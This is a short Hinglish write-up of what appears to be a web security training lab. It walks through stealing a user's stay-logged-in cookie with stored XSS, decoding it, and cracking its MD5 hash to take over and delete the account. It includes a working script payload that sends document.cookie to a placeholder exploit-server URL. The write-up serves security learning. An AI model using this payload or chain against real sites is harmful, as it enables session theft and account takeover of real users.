# Offline Password Cracking
Is lab ka goal tha Carlos ka stay-logged-in cookie crack karna, jisme XSS aur offline hash cracking dono techniques use karni thi.

✅ Sabse pehle, maine apne credentials wiener:peter ke sath login kiya aur “Stay logged in” option tick kiya.
✅ Login ke baad, Burp Suite ke HTTP History tab me jaa kar cookie ka format dekha.
✅ Phir main ek blog post par gaya aur uske comment section me stored XSS payload inject kiya:

<script>document.location="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit"+document.cookie</script>
✅ Maine apna valid Exploit Server URL wahan daala, comment post kiya, aur phir Access log dekha.
✅ Wahan mujhe stay-logged-in cookie mila jo Base64 encoded tha, jaise:

Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
✅ Is cookie ko maine Burp Decoder me decode kiya to yeh mila:

carlos:26323c16d5f4dabff3bb136f2460a943
✅ Phir maine hash ko Crackstation.net me paste kiya, aur mil gaya password:

onceuponatime
✅ Finally, carlos user ke credentials se login kiya aur My Account section me jaa kar account delete kar diya.
🎯 Lab Solved!

## 💡 Techniques used:

- Stored Cross-Site Scripting (XSS) for cookie stealing

- Base64 decoding

- MD5 hash cracking (offline password attack) using online wordlists

- Cookie-based authentication bypass

Yeh real-world scenario un cases me use hota hai jab attacker XSS ke zariye kisi ka session hijack karein, ya phir insecurely hashed passwords ko crack kar ke unauthorized access lein.
